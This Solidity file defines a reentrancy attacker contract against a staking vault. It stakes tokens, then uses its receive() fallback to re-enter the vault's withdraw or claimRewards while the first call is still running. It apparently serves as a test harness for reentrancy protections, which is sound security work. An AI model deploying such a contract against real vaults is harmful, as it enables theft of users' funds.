// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IStakingVault {
    function stake(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function claimRewards() external;
}

contract ReentrantStakingAttacker {
    enum AttackMode {
        None,
        Withdraw,
        ClaimRewards
    }

    IERC20 public immutable stakingToken;
    IStakingVault public immutable vault;
    AttackMode public attackMode;
    uint256 public attackAmount;

    constructor(address _vault, address _stakingToken) {
        vault = IStakingVault(_vault);
        stakingToken = IERC20(_stakingToken);
    }

    function stake(uint256 amount) external {
        stakingToken.approve(address(vault), amount);
        vault.stake(amount);
    }

    function attackWithdraw(uint256 amount) external {
        attackMode = AttackMode.Withdraw;
        attackAmount = amount;
        vault.withdraw(amount);
        attackMode = AttackMode.None;
    }

    function attackClaimRewards() external {
        attackMode = AttackMode.ClaimRewards;
        vault.claimRewards();
        attackMode = AttackMode.None;
    }

    receive() external payable {
        if (attackMode == AttackMode.Withdraw) {
            vault.withdraw(attackAmount);
        } else if (attackMode == AttackMode.ClaimRewards) {
            vault.claimRewards();
        }
    }
}
